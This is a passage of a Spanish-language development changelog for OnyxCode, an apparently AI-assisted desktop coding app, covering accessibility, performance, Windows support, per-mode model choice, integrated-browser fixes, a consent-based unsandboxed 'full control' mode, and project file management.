- **Foco de los diálogos.** `lib/modal-focus.ts` (instalado en `main.tsx`) vigila `[aria-modal="true"]`: al abrirse mete el foco si el diálogo no lo hizo, Tab/Mayús+Tab no salen del diálogo de más arriba (sin pisar a los que ya lo hacen) y al cerrarse devuelve el foco al control previo
  si sigue en pantalla y el foco se perdió. Antes ni la confirmación, ni el editor de Rutinas, ni el catálogo MCP devolvían el foco, y varios asistentes/tarjetas no tenían trampa. El selector de sesión de Code y el de worktree pasan a `aria-modal`; el selector cierra con Esc desde cualquier control.
  Unitaria de la función pura `tabTarget`; E2E de contrato (entra, 25 Tab y 25 Mayús+Tab sin salir, Esc cierra y devuelve el foco) en cada diálogo.
- **No es violación / se deja.** Compositor de Code: `aria-allowed-role` _minor_ (combobox en textarea), igual que en F8-B33. El ejemplo de «Quick Entry» no se audita con axe (ventana con preload propio, sin cambios). Menú contextual de tareas y popovers de confirmación en línea de Code (`alertdialog` sin `aria-modal`): son
  inline, no modales, y no devuelven el foco al cerrar. Tras renombrar/mover una tarea el foco no vuelve (el control que lo abrió desaparece).
- Requiere VoiceOver manual: anuncio de los diálogos (nombre y descripción al abrir), orden de foco del asistente y del editor de Rutinas, la región de la píldora, y el combobox de Code. Sin cambios en preloads (hashes idénticos) ni en SEGURIDAD.md; sin IPC nuevo. Capturas en `scratchpad/shots-rc/`.

## F8-B37 — Calidad R3-A: rendimiento y continuidad en el renderer

- **Cifras de diff sin parsear (1).** Todos los consumidores de `parseUnifiedDiff`/`diffStats` revisados con grep: `DiffView` ya recortaba (T4); `diffStats` (chip de edición y tarjeta de permiso de Code, panel Cambios) pasa a contar `+N −M` recorriendo el texto sin trocearlo ni crear un objeto por línea (misma semántica que el parser, probada contra él en 8 casos), y la tarjeta de permiso de Tareas
  usa `hasDiffChanges` (se detiene en la primera línea cambiada). Microbenchmark (node, CPU real): 50 000 líneas 7,3 ms → 0,4 ms; 1 000 000 líneas / 43 MB 113 ms → 11 ms y sin 1 M de objetos. **Medición honesta:** en el E2E con CPU ×4 (`calidad-r3a.e2e.ts`, diff de 50 000 líneas) la tarea larga máxima antes/después es la misma dentro del ruido
  (chip 189–217 ms, permiso de Code ~515 ms ×4 = ~130 ms reales; con un diff de 200 líneas la base ya es ~200 ms ×4): lo que quedaba era el render del propio tope de 2000 filas, no el recuento. El cambio protege a diffs de decenas de MB, no mueve la cifra de 50 000 líneas. Umbral de la prueba: 200 ms reales (800 ms ×4).
- **Adjuntos de Code (2).** Viven en `stores/drafts.ts` (`code:<proyecto>:<sesión>:att`), en memoria: sobreviven al cambio de modo y de sesión, con tope de 20 MB por borrador y 60 MB entre todos (al pasarse se libera el borrador con adjuntos más antiguo de OTRA conversación; el actual nunca). Se liberan al enviar (el compositor vuelve a `[]`) y al borrar la sesión
  (`removeSession` → `clearSessionDrafts`, que también libera texto y menciones). Si el envío falla desde una sesión nueva, el adjunto vuelve también al borrador de la sesión creada. El tope también cubre los adjuntos de Chat (R2-B), que ya usaban el almacén sin límite global.
- **Scroll por conversación (3).** `useStickToBottom` guarda `{scrollTop, pegado}` por conversación (clave = id del primer mensaje) en una memoria de módulo acotada a 200 entradas (descarta la más antigua). Al volver (las vistas siguen desmontándose al cambiar de modo, como decidió T3) se restaura antes de pintar: pegada al final → final; si no, su posición y «Ir al final» visible. Chat, Code y Tareas comparten el hook.
- **Quick Entry (4).** Si el envío falla sin conversación activa, además de dejar el texto en el compositor de Chat (ya ocurría), se muestra un aviso cerrable bajo las cabeceras de la ventana principal (`QuickEntryNotice`, `role="alert"`, es/en `notices.quick.*`) con el motivo (`friendlyError`) y «Conectar una IA» si procede. Se cierra solo al salir de Chat.
- **«e» suelta en la terminal (5).** Reproducida con un `.zshrc` lento y determinista (`ZDOTDIR` de prueba, 2 s): no era del reenganche. Lo tecleado mientras el shell carga lo hace eco el núcleo (modo cocinado) y se queda en la primera línea antes del prompt («e%» de la captura de T3: la «e» de `echo` más la marca `%` de zsh); el reenganche deja las filas idénticas.
  `panels/inputGate.ts` retiene el teclado hasta la primera salida del shell (+60 ms) o 3 s como máximo y lo entrega junto; después, directo. La prueba E2E falla sin el cambio (primera fila = eco) y pasa con él; el reenganche repetido deja las filas iguales.
- Pruebas: unitarias (`DiffView.test.tsx` equivalencia con el parser y 50 000 líneas, `drafts.test.ts` topes/evicción/`clearSessionDrafts`, `use-stick-to-bottom.test.ts` memoria acotada, `inputGate.test.ts`); E2E `calidad-r3a.e2e.ts` (8 pruebas; las de scroll y adjuntos se comprobaron FALLANDO con el código anterior: scrollTop 3441 → 4041 sin la memoria). Capturas en `scratchpad/shots-r3a/`.
- No probado: arrastrar/pegar una imagen real del portapapeles (se usa el `input[type=file]`, que comparte ruta); memoria con cientos de adjuntos grandes reales; la «e» con el `.zshrc` real del usuario (solo se reproduce con shell lento). Sin cambios en preloads (hashes idénticos), sin IPC nuevo ni cambios en SEGURIDAD.md.

## F8-B38 — Calidad R3-B: accesibilidad de Cuenta y Quick Entry, prueba inestable, medición y descartar por bloque

- **Accesibilidad (axe, claro y oscuro).** `e2e/specs/calidad-r3b.e2e.ts` audita con el servidor de cuentas falso (`e2e/fake-auth`, sin red real) la pantalla de acceso (inicio, correo, código, código erróneo), Ajustes › Cuenta, su diálogo «Borrar mi cuenta» y la ventana Quick Entry (vacía y con texto). Hallazgos y arreglos:
  botones de peligro (`bg-danger text-white`): en oscuro el blanco sobre el salmón daba ~2,3:1 (_serious_, «Borrar mi cuenta», confirmaciones, conflicto) → token `--danger-fg` (blanco en claro, `#2a0805` en oscuro; `Button`, `ConfirmDialog`, `ui.tsx` de Code, lista de Chat, insignia de conflicto);
  Quick Entry: la pista «esc cerrar» (`--q-muted`) no llegaba a 4,5:1 en claro ni en oscuro (_serious_) y la ventana no tenía landmark (_moderate_ `region`) → `--q-muted` más contrastado y el contenedor pasa a `<main>`. La pantalla de acceso y la Cuenta en claro no tenían violaciones.
  No auditado: el aviso de error de Quick Entry (lo cambia R3-A en paralelo).
- **`no-ai.e2e.ts` (d) inestable: causa raíz y arreglo.** Bucle de 30 ejecuciones aisladas (`-t "(d)"`, sin reintentos), sobre el código anterior: sin carga 29/30 (1 fallo, el de «Ocultar detalle») y con carga de CPU (10 `yes`, un núcleo cada uno) 30/30. Causa: `ErrorNotice` ponía el rótulo de «Ver detalle» desde el evento `toggle` de
  `<details>`, que se despacha en una tarea posterior a que el contenido ya esté visible; la prueba esperaba el contenido (`statusCode: 401`) y leía el texto de la página antes de que llegara `toggle`, con el rótulo viejo. No era la animación ni el estado inicial. Arreglo en el producto: `<details>` controlado
  (`open` desde React, el clic de `<summary>` alterna el estado), de modo que rótulo y contenido cambian en el mismo render; la prueba además espera «Ocultar detalle» con reintento. Tras el arreglo: 30/30 sin carga y 30/30 con carga. Honestidad: el fallo sin arreglo es raro (1/30, y 0/30 con carga), así que la evidencia de causa es el
  mecanismo y la firma idéntica del único fallo capturado, no una diferencia estadística grande.
- **`npm run perf:startup` (manual, fuera de `verify`).** `e2e/perf/startup.perf.ts` + `vitest.perf.config.ts`: arranque en frío (5 lanzamientos: primer pintado e interactiva) y RSS de todo el árbol de procesos con 3 conversaciones largas falsas durante 5 min. Umbrales sugeridos y cifras actuales en `docs/VERIFICACION.md`:
  primer pintado 398 ms (máx. 466), interactiva 600 ms (máx. 645), RSS 585 MB sin conversaciones, pico 871 MB al cargar las tres, ~725 MB asentado y 586 MB a los 5 min (sin fuga). Nada superó un umbral razonable: sin cambios de producto por este punto.
- **Descartar cambios en Code (M3 completo).** (1) _Se conserva lo preparado:_ `git:discard` acepta `scope: 'unstaged'` y el panel lo usa desde la fila de «No preparados» (solo el árbol de trabajo vuelve a lo preparado; el diálogo lo dice); desde «Preparados» sigue yendo todo a HEAD. «Deshacer» ahora también vuelve a preparar lo que estaba preparado
  (blob del índice con `git update-index --cacheinfo`, o `git rm --cached` si el borrado estaba preparado) y se apoya en el hash del archivo tras el descarte en vez de en `git status`. (2) _Por bloque:_ canal nuevo `git:discardHunk` (solo ventana principal, esquema estricto, sin rol secundario; preload `code.git.discardHunk`), botón «Descartar este bloque» en cada `@@` del diff de «No preparados»
  de un archivo modificado, con confirmación que muestra el bloque. Se implementó porque se puede garantizar todo o nada: main recalcula el diff y exige que el bloque coincida exactamente con el visto (si el archivo cambió, se rechaza), guarda copia completa antes, hace `git apply -R --check` y luego `git apply -R` solo sobre el árbol (atómico, no toca lo preparado) y «Deshacer»
  restaura la copia solo si el archivo sigue idéntico al que dejó el descarte. Detalle de seguridad en `docs/SEGURIDAD.md` §3 terdecies/quaterdecies. Textos nuevos `code.changes.discardHunk*`/`discardKeepsStaged` y `common.git.discard.hunk*` en es/en; `shared/diff-hunks.ts` trocea el diff (lo usan main y renderer).
- Pruebas: `git/discard.test.ts` (28 casos con repos temporales reales: conservar lo preparado y deshacer, borrado preparado, añadido con cambios, bloque que se quita sin tocar el otro ni lo preparado, bloque obsoleto/inexistente/de otro archivo, rutas fuera del repo/`.git`/archivos nuevos, deshacer que no pisa ediciones posteriores, CRLF y sin salto final),
  `diff-hunks.test.ts`, `discard-logic.test.ts`; E2E `calidad-r3b-discard.e2e.ts` (repo real: confirmar/cancelar, bloque descartado, lo preparado intacto, «Deshacer», canal con bloque falso y rutas hostiles) y `calidad-r3b.e2e.ts` (axe). Capturas en `scratchpad/shots-r3b/`.
- No probado: VoiceOver en Cuenta, Quick Entry y el botón por bloque; descartar bloques en repos muy grandes o con filtros `clean/smudge`/`autocrlf` exóticos (se probó CRLF y archivo sin salto final); que `git apply` falle de forma limpia en discos llenos (la copia previa queda y se borra al fallar).

## F8-B39 — Windows T1: arranque (rama `feat/win-t1-arranque`)

Primera tanda para que OnyxCode arranque en Windows (alcance v1: Chat, Code, Rutinas en modo Code, Ajustes, cuentas, idioma, Diagnóstico, MCP, Git/restauración). Modo Tareas (Seatbelt), Control del PC y actualizador quedan solo en macOS.

- **Herramientas** (`scripts/win/`): `sync.sh` (Mac: empaqueta el árbol, lo sube por scp y ejecuta `C:\onyx\run.ps1`, devuelve el código de `summary.txt`), `run.ps1` (en `C:\onyx\`: mata huérfanos al empezar y al acabar, `robocopy /MIR` a `C:\onyx\wt`, `npm ci` solo si cambia `package-lock.json`, cada paso con límite de tiempo y `taskkill /T /F`), `smoke.ps1` (arranque real sin pantalla, cierre por `WM_CLOSE`, huérfano simulado) y `procs.ps1`.
- **package.json**: `scripts/build-native.mjs` (no hace nada fuera de darwin) en `dev`/`build`, `scripts/with-env.mjs` (variables de entorno sin sintaxis POSIX) en `test:fs|stress|e2e:prod`/`perf:startup`, `package:win`, `check:win-bundle`. `.gitattributes` (`* text=auto eol=lf`, binarios).
- **`child-env.ts`**: en win32 la variable es `Path` (la lista blanca sensible a mayúsculas la descartaba); lista blanca de Windows (SystemRoot, USERPROFILE, APPDATA, LOCALAPPDATA, TEMP/TMP, PATHEXT, ComSpec, ProgramData…), claves sin distinguir mayúsculas, carpetas extra (`.opencode\bin`, `%LOCALAPPDATA%\Programs`, Git `cmd`). El comportamiento en macOS no cambia.
- **`pids.ts`**: en Windows `taskkill /PID n /T /F` y `Get-CimInstance Win32_Process` (PowerShell, 5 s, solo si hay `pids.json`); `isOpencodeServe` reconoce `"…\opencode.exe" serve`. `server.ts`/`dialog/service.ts`/`tasks-files-handlers.ts`: `detached` solo fuera de win32 y `windowsHide: true`.
- **`platform-caps.ts`** (`capsFor`): `src/main/index.ts` carga con `import()` dinámico `update/boot`, `update/swap`, `ipc/update` y `ipc/tasks-handlers` solo en darwin; fuera de darwin `registerRoutinesHandlers` (planificador sin Tareas: `RoutineTasksPort` + `noTasksPort`, `merr.routine.platformUnsupported` es/en) y `registerUnsupportedHandlers` (canales `tasks:*`/`computer:*`/`app:update*` responden `PLATFORM_UNSUPPORTED`; lecturas neutras `[]`/`null`/prefs por defecto/«sin actualización»). `out/main/index.js` queda sin código de macOS (`npm run check:win-bundle`; las cadenas de i18n con «sandbox-exec»/«cu-helper» se ignoran: el `grep` literal del plan da 4 por eso). Hashes de `out/preload/*.js` idénticos a main.
- **`tasks/policy.ts`**: política gestionada en `%ProgramData%\OnyxCode\managed.json` y raíces `C:\…`/UNC/`~\` en win32.
- **OpenCode embebido**: `pin.json` por plataforma (`assets["darwin-arm64"|"win32-x64"]`), `fetch-opencode.mjs` extrae con `tar.exe` de System32 y deja `opencode.exe`; `bundledOpencodePath` usa `.exe` en win32.
- **Pruebas**: `src/test/platform.ts` (`macOnly`/`posixOnly`/`winOnly`); casos win32 de `child-env`, `pids` (procesos reales: árbol muerto con `taskkill /T`), `fetch-opencode` (descarga/SHA/extracción reales con `tar.exe`), `policy`, `isInside`, `unsupported-handlers`, rutinas sin Tareas. Los saltos en Windows están listados en `docs/VERIFICACION.md` (Windows).
- **Medido**: `OPENCODE_BIN` → listo en ~1,3–1,6 s; al arrancar el renderer (modo Chat) solo invoca `app:updateState` y `app:bootConfirm` de los canales simulados; OpenCode respeta `XDG_DATA_HOME/CONFIG/CACHE/STATE` en Windows (data en `%XDG_DATA_HOME%\opencode`; `home` sigue siendo `%USERPROFILE%` y su `tmp` es `%TEMP%\opencode`); el ZIP `opencode-windows-x64.zip` trae solo `opencode.exe` (180 320 648 bytes) en la raíz.

## F8-B40 — Windows T2: Code y interfaz (rama `feat/win-t2-code-ui`)

Segunda tanda de Windows: terminal, Diagnóstico sin datos personales, interfaz sin las funciones solo de macOS y textos propios.

- **Terminal** (`pty/shell.ts`, puro): en win32 la shell por defecto es `pwsh.exe` (Program Files o `Path`) y, si no existe, Windows PowerShell 5.1 con `-NoLogo` (antes `COMSPEC`/cmd); `$SHELL` se ignora en Windows. `electron-builder.js`: en Windows `asarUnpack` incluye `node_modules/node-pty/**` (conpty.node, `conpty/conpty.dll`, `conpty/OpenConsole.exe` y el worker no pueden vivir dentro del .asar); en macOS no cambia nada. Prueba real en Windows (`service.win.test.ts`): carga de los prebuilds, shell por defecto, un comando y salida.
- **VS Code** (`dialog/code-candidates.ts`): `Code.exe` de `%LOCALAPPDATA%\Programs\Microsoft VS Code` y de `%ProgramFiles%`; sin él, `shell.openPath` (ya no se intenta `code.cmd`, que no arranca sin shell).
- **Diagnóstico** (`diagnostics/redact.ts`, privacidad): la carpeta del usuario se sustituye por `~` en todas sus variantes de Windows (`C:\Users\x`, `C:/Users/x`, `C:\\Users\\x` de JSON, otra capitalización de ruta y unidad, `file:///C:/…`, `%5C`/`%3A` codificados, `/c/Users/x` de Git Bash, `/mnt/c/Users/x` de WSL, UNC, nombres con espacios) y, además, cualquier `<unidad>:\Users\<nombre>` aunque no sea el usuario actual. Patrones lineales (prueba con 100 000 caracteres). Sin cambios en macOS.
- **Rutas**: `util/paths.ts` (`samePath`, `normalizeDrive`) y `git/service.ts` (comparación de worktrees sin distinguir mayúsculas en win32); renderer `lib/paths.ts` (`tildify`, `shortenPath`, `baseName`, `splitPath` con `\` y unidad) usado en Code, Uso y Rutinas.
- **Ventana y sistema**: icono de bandeja a color en Windows (`tray-style.ts`; en macOS sigue la plantilla negra), Quick Entry `Alt+Shift+Space` por defecto en win32 (`defaultQuickEntryShortcut`), `flashFrame` al notificar con la ventana en segundo plano, marco nativo de Windows y sin hueco de semáforos (`lib/platform.ts` lee `window.api.platform`; el preload no cambia).
- **Sin Tareas/Control/actualizador** (`platform-caps`, `modeAvailable`/`usableMode`): Tareas sale del selector, la paleta y los atajos; un modo guardado cae a Chat; Ajustes oculta Tareas, Red, Modo auto, Control del PC, «Mantener despierto» y Actualizaciones, con un aviso `platform.win.unavailable.*` (es/en); el asistente omite «Permisos de macOS»; Rutinas no ofrece el modo Tareas y las ya guardadas muestran aviso y no se pueden lanzar desde la interfaz.
- **Textos**: `shared/i18n` admite variantes `clave.win` (se aplican solo en win32; en macOS y en las pruebas no cambia ningún texto): Finder → Explorador, Llavero → almacén de credenciales, «tu Mac» → «tu PC», atajos con Ctrl, bandeja, Dock → barra de tareas. Los textos de Tareas/Control (`tasksComputer`…) no se tocan.
- **Medido en Windows**: unit 1475 pruebas verdes (119 saltadas por la tanda 1), build en 14 s, humo de arranque OK (listo en 1,8 s, sin consola, sin huérfanos).
- **No probado**: ventana visible (axe, aspecto de la bandeja y del marco, parpadeo de la barra de tareas, atajo global real), `Code.exe` real, descartar bloques con `shell.trashItem` y revert de sesión de OpenCode en un repo bajo `C:\onyx\tmp`, «Ejecutar ahora» de una rutina Code. `node-pty` empaquetado (`app.asar`) y su `fork` de `conpty_console_list_agent` con `runAsNode` desactivado quedan para la tanda 4 (instalador).

## F8-B42 — El modelo elegido en Chat ya no se cambia en silencio (rama `fix/modelo-elegido-se-pierde`)

Bug: en Chat el usuario elegía un modelo (p. ej. OpenCode Go · GPT 5.6 luna), salía y al volver «estaba puesta otra IA».
Causa confirmada: la elección SÍ se guarda (`settings.defaultModel`, store y `settings.json` correctos al cambiar de modo, abrir Ajustes
y reiniciar; pruebas (a)-(c)), pero `resolveModel` sustituía en silencio cualquier modelo ausente de la lista de proveedores cargada
por el predeterminado de la primera IA conectada, y el selector y el envío usaban ese sustituto. Basta con que la lista no traiga el
modelo (lista vieja, proveedor sin clave, modelo retirado) para que se vea y se use otro. No se pudo reproducir con el OpenCode real
por qué la lista pierde el modelo (no probado), pero el efecto visible queda cubierto.

Cambios:

- `shared/ai-availability.ts`: `isChoiceUnavailable` (elección explícita ausente de la lista cargada; no aplica sin IA configurada, con
  la lista sin cargar ni al predeterminado de fábrica nunca tocado) y `sendGate(..., unavailable)` con motivo `model-unavailable`.
- `lib/ai-gate.ts`: opción `strict` (solo Chat). Con la elección no disponible no hay modelo efectivo, el envío se bloquea y la lista de
  proveedores se recarga una vez por modelo. Code y Tareas conservan el comportamiento anterior. Nada se persiste jamás.
- Chat: el selector muestra el modelo elegido marcado «no disponible», aviso encima del compositor, compositor bloqueado con texto
  propio y `sendChatMessage` lanza un mensaje claro en vez de enviar con otro modelo (es/en).
- Pruebas: unitarias (`ai-availability.test.ts`, `main/store.model.test.ts`) y E2E `model-choice.e2e.ts` (disco + store + DOM; cambiar de
  modo, Ajustes, reinicio con el mismo userData, lista sin cargar, modelo ausente, proveedor sin clave y reconexión).
- Pendiente de decidir: Ajustes › Modelos ofrece un modelo «Chat» por modo (`modelsByMode.chat`) que Chat ignora (usa `defaultModel`).

## F8-B41 — Navegador integrado: páginas locales sin estilos y pestañas que no se cierran (rama `fix/navegador-css-pestanas`)

- **Causa raíz 1 (confirmada con E2E real, `e2e/specs/navegador.e2e.ts`)**: la regla de red (`session.ts`, `installNetworkGuard`) solo dejaba pasar los subrecursos locales si el origen de la página estaba en «Permitir siempre» (`isLocalOriginApproved`). Una página local que escribe el usuario (que no se aprueba en ningún sitio) o que el agente abre con «Permitir en esta tarea» (aprobación solo en memoria) cargaba el HTML, pero su CSS e imágenes se cancelaban (`ERR_BLOCKED_BY_CLIENT`, `destino local bloqueado ... tipo=stylesheet`). Arreglo: se deja pasar lo que tiene el mismo origen exacto `host:puerto` que la página (`sites.ts`: `hostPortOf`, `localSubresourceAllowed`). Un recurso a OTRO puerto local sigue bloqueado salvo «Permitir siempre» en el origen de la página (sin cambios; SEGURIDAD.md actualizado). Sin página (service worker, webContents destruido) sigue bloqueado.
- **Causa raíz 2**: `destroyTab` nunca cerraba el `webContents` (el comentario suponía recolección de basura) y `layoutView` solo quitaba la vista nativa al cambiar de ventana: al cerrar una pestaña su vista seguía colgada y visible, y el webContents vivo (JS, audio, red). Arreglo: `destroyTab` llama `wc.close()`; `layoutView` mantiene UNA vista por owner (`attachedTabId`) y quita la anterior al cambiar de pestaña, al cerrarla o al quedarse sin ninguna; `discardTab` unifica cerrar desde la UI, desde el agente, tras un `new_page` fallido y al salir; tras cerrar se reelige la pestaña activa y se vuelve a emitir el estado (antes la UI ignoraba el resultado de `closeTab` y quedaba con la pestaña activa ya cerrada); el aviso `destroyed` no se emite dos veces.
- **Pruebas**: `session.test.ts` (guard con peticiones simuladas: mismo origen, otro puerto, `localhost` vs `127.0.0.1`, siempre, sin webContents, remoto), `sites.test.ts`, y E2E con Electron real y servidor estático (HTML+CSS+PNG) en puerto efímero: página tecleada por el usuario y página aprobada «en esta tarea» con `getComputedStyle`/`naturalWidth`; una imagen de otro puerto local no aprobado no llega al servidor; cerrar una pestaña la quita de la lista, del DOM, de las vistas nativas y destruye su webContents; cerrar la última deja el panel vacío.
- **Efecto colateral corregido**: al mostrarse de verdad la vista de la pestaña del agente (antes quedaba oculta tras la del usuario), el `mouseMove`/`mouseLeave` que Chromium sintetiza cuando la vista aparece o cambia de sitio bajo un puntero quieto (p. ej. al cerrarse la tarjeta de aprobación) contaba como «usuario activo» y rechazaba la acción del agente recién aprobada. `layoutView` suprime 400 ms la entrada humana tras aparecer/mover la vista (`LAYOUT_SYNTH_INPUT_MS`).
- **Verificado**: `npm run verify` completo en la Mac (1586 unit, 238 E2E verdes) y capturas antes/después en `scratchpad/shots-nav/`. **No probado**: ventana «Navegador» aparte (popout) con varias pestañas, audio/vídeo en una pestaña al cerrarla, service workers locales (siguen bloqueados hacia destinos locales: sin `webContents` no hay página de referencia).

## F8-B43 — Cada modo recuerda su propio modelo (rama `fix/modelo-por-modo`)

Bug: el dueño elegía GPT en un modo, salía y volvía (o reiniciaba) y estaba otra vez el predeterminado. Causas: Code guardaba
el modelo solo en memoria (`useCode.model`, `null` al arrancar); Chat escribía `settings.defaultModel` (pisaba el predeterminado
global sin querer) y su fila de Ajustes › Modelos (`modelsByMode.chat`) no se leía.

Diseño: `settings.defaultModel` es el predeterminado global y solo vale para los modos sin elección propia; Chat, Code y Tareas
recuerdan su modelo en `modelsByMode` (`extras.json`, vía `extras:setPrefs`). Elegir un modelo en un modo NO toca el predeterminado.

- `settings/impl/extras.ts`: resolvedor puro `pickModeModel`, `withModeModel`, `setModeModel(mode, ref|null)` y `whenExtrasLoaded`.
- Chat: selector, envío y «compactar» usan `modelsByMode.chat`; «Probar un modelo gratuito» lo fija como modelo de Chat. Se mantiene
  el comportamiento de B42 (modelo ausente: «<id> · no disponible», envío bloqueado, sin sustituto persistido).
- Code: el modelo elegido se persiste como `modelsByMode.code`; sin elección vale el del modo. `setModel(m, remember=false)` es
  la sincronización interna de `Composer` (sustituto por IA conectada) y no persiste. Cambiar de modelo descarta el esfuerzo.
- Tareas: sin cambios de comportamiento (el `taskModel` de la tarea sigue mandando); además, un cambio desde Ajustes sin tarea
  abierta lo toma la siguiente.
- Ajustes › Modelos: la fila de cada modo edita lo mismo que el selector del modo; «Usar el predeterminado (<modelo>)» borra el
  override; textos es/en explican la relación.
- Rutinas: una rutina nueva parte del modelo de su modo (y lo guarda en la propia rutina). Quick Entry envía con el modelo de Chat
  (espera a que las preferencias estén cargadas).
- Compatibilidad: usuarios con solo `defaultModel` y sin overrides, igual que antes; sin migración.
- Pruebas: `extras.test.ts` (resolvedor) y E2E `model-por-modo.e2e.ts` (fallan en main); `model-choice.e2e.ts` adaptado.

## F8-B41 — Windows T3: pruebas (rama `feat/win-t3-pruebas`)

Tercera tanda de Windows: las unitarias y las E2E corren en el PC de pruebas.

- **Lanzador falso solo para pruebas** (`opencode/test-launcher.ts`): sin empaquetar, en win32 y con `OPENCODE_BIN` terminado en `.mjs`, `server.ts` y `binary.ts` ejecutan `node <mjs>`; `ONYXCODE_TEST_BUNDLED_DIR` acepta `opencode.mjs`. Nunca aplica a la app empaquetada ni a un `.exe`.
- **Terminal**: `pty/service.ts` devuelve el pid vivo en `list()` (en Windows/ConPTY `pty.pid` era 0 al crear la terminal). **Asistente**: variantes `.win` del título y la guía del paso «modos» («Los tres modos»).
- **Pruebas**: `e2e/lib/proc.ts` (procesos multiplataforma), `e2e/win-skip.json` (5 specs de Tareas/actualizador, con motivo y guardia `win-skip.test.ts`), saltos solo de bloques de Tareas, unitarias de `binary` con falso `.mjs`, specs adaptadas (atajos, textos PC/Mac, asistente de 4 pasos, 8 secciones de Ajustes, `core.autocrlf=false`). Detalle y pendientes en `docs/VERIFICACION.md`.
- **Medido**: Windows, E2E completas 29 archivos / 162 pruebas verdes (49 saltadas, 2 pasaron en el reintento), ~8 min; Mac `npm run verify` verde.
- **Pendiente (defecto, no excluido por alcance)**: en el navegador integrado el clic del agente no llega a la vista en Windows (2 pruebas del Lote D saltadas).

## F8-B44 — Control total sin carpeta (rama `feat/control-total-sin-carpeta`)

Petición del dueño: al elegir «Control total del Mac» no se pide carpeta; el agente puede operar en todo el equipo.

- **Antes**: Control total era una concesión POR CARPETA (`tasks:grantFullAccess`), exigía una carpeta autorizada (`approveFolder`, que rechaza el home) y la pantalla de inicio pedía «Elegir carpeta» y «Permitir».
- **Ahora**: el consentimiento es UNO por equipo (`tasks-folders.json › fullAccessConsentAt`, con fecha), pedido en el diálogo de siempre (texto actualizado: sin carpeta, acceso a todos los archivos y programas, se pregunta una vez). La carpeta de trabajo es la actual si ya hay una elegida; si no, la última usada en Control total o la carpeta personal (`fullAccessDir`). «Cambiar carpeta» (opcional) en el aviso del inicio. Sin consentimiento, `tasks:start {fullAccess}` falla con `FULL_ACCESS_NOT_GRANTED`.
- **IPC nuevos**: `tasks:fullAccess:state`, `tasks:fullAccess:consent`, `tasks:fullAccess:revokeAll`. `grantFullAccess`/`revokeFullAccess` por carpeta se conservan (compatibilidad: una carpeta con concesión antigua sigue funcionando sin consentimiento nuevo; sin migración destructiva).
- **Retirar**: Ajustes › Tareas › «Control total del Mac» (fecha del consentimiento y «Retirar consentimiento»): borra consentimiento y concesiones por carpeta y detiene los servidores sin sandbox; vuelve a pedirse el diálogo.
- **Sin cambios**: plan-gate, aprobaciones por app, ⌘⇧Esc, comprobaciones TCC, Sandbox (sigue pidiendo carpeta y rechazando el home), perfil Seatbelt, credential proxy, provider-egress, proxy-policy y folder-policy (no se tocaron).
- **Efectos de no tener carpeta autorizada**: la carpeta personal no se recorre para «entregables» ni se crean puntos de restauración (se avisa); las funciones de la interfaz (vista previa, ZIP…) ven el espacio de Control total pero nunca `~/.ssh` ni los demás secretos que el sandbox niega; no se migra la carpeta de trabajo antigua en el home. Con `allowedFolderRoots` (política) Control total sigue exigiendo carpeta autorizada.
- **Rutinas** en modo Tareas con Control total: el interruptor aparece con el consentimiento del equipo y la carpeta ya no tiene que estar autorizada para Sandbox; el consentimiento propio de cada rutina y la aprobación humana del plan se mantienen.
- **Interfaz**: aviso «Sin sandbox · acceso a todo tu equipo · carpeta de trabajo: ~» en el inicio y «Control total no está confinado» en la barra roja mientras una tarea corre; la carpeta personal se llama «Carpeta personal».
- **Pruebas**: `manager.fullaccess.test.ts` (11) y E2E `control-total.e2e.ts` (4: sin carpeta ni selector, cwd = home falso, consentimiento con fecha, indicador, revocar, Sandbox sigue pidiendo carpeta). Windows: modo no disponible, sin cambios.

## F8-B45 — Archivos del proyecto: vigilante, gestor y «Abrir en…» (rama `feat/archivos-vigilante-gestor-editor`)

Petición del equipo: el panel de Archivos (modo Code) se actualiza solo, permite crear/renombrar/eliminar y abre el proyecto con un editor.

- **Actualización automática (sin polling).** `files:watch`/`files:unwatch`/`files:setDirs` + evento `files:changed`: `fs.watch` recursivo en main (macOS/Windows; en Linux solo carpetas abiertas), coalescido ≈200 ms, ignorando `.git`, `node_modules`, `dist`, `out`, `build`, `.next`, `target`, `__pycache__`, `.venv`… Solo mientras el panel está visible; se libera al cerrar/cambiar de proyecto/ocultar la ventana. Topes y errores (EMFILE/ENOSPC/carpeta desconectada) sin tumbar la app: aviso «ya no se vigilan los cambios» y el botón Actualizar sigue (y reintenta la suscripción). El panel Cambios también se refresca con el mismo evento (`fsVersion`).
- **Gestor de archivos.** `files:create`/`files:rename`/`files:trash`: botones Nuevo archivo/carpeta, menú contextual, F2 / Supr, botones por fila accesibles con Tab, edición en línea. Validación en main (raíz con realpath, sin `..`, sin `.git` ni la raíz, enlaces simbólicos como enlaces, nombres válidos y reservados de Windows, nunca sobrescribe); eliminar va a la Papelera (Papelera de reciclaje en Windows) con confirmación.
- **«Abrir en…».** `editors:list`/`editors:open`: VS Code, Cursor, Zed, Sublime Text, WebStorm, IntelliJ IDEA y «Predeterminado del sistema»; el renderer solo envía un id del catálogo fijo; detección por rutas conocidas, `spawn` sin shell; recuerda el último en `extras.json › lastEditor`. `dialog:openInEditor` (menú del proyecto) no cambia.
- **Pruebas**: `fs-ops.test.ts` (34), `watcher.test.ts` (22), `editors/catalog.test.ts` (13), `files-logic.test.ts` (6), esquemas IPC (+5) y E2E `archivos-mx.e2e.ts` (7: aparece solo un archivo creado fuera, Cambios se actualiza, crear/renombrar/eliminar por la UI, rutas hostiles, «Abrir en…» con editor simulado). Variables de prueba: `ONYXCODE_E2E_EDITOR_LOG`, `ONYXCODE_E2E_EDITORS` (solo sin empaquetar).
- **Sin probar**: editores reales y Windows (rutas de instalación y `fs.watch` recursivo en Windows solo verificados con detección simulada); Linux no tiene vigilancia recursiva (modo carpetas abiertas, probado con vigilantes simulados).

## F8-B46 — Navegador en versión de escritorio y atajos configurables (rama `feat/navegador-escritorio-atajos`)

Dos peticiones del equipo.

### Navegador integrado: versión de escritorio por defecto

- **Causa**: el panel del navegador es estrecho (≈ 500–700 px), así que el viewport real de la página activaba sus `@media (max-width: …)` y salía la versión móvil (el user agent ya era de escritorio).
- **Ahora**: cada pestaña emula un viewport de **1280 px** (`webContents.enableDeviceEmulation`, `viewSize` + `scale` para que quepa en el panel; sin CDP `Emulation.*`, que sigue fuera de `ALLOWED_CDP`) y user agent de escritorio (el de la sesión, sin `Electron/…`). Con el panel ≥ 1280 px no hay emulación. Se reaplica al cambiar el tamaño del panel y tras cada navegación (la emulación se pierde si cambia el proceso de render).
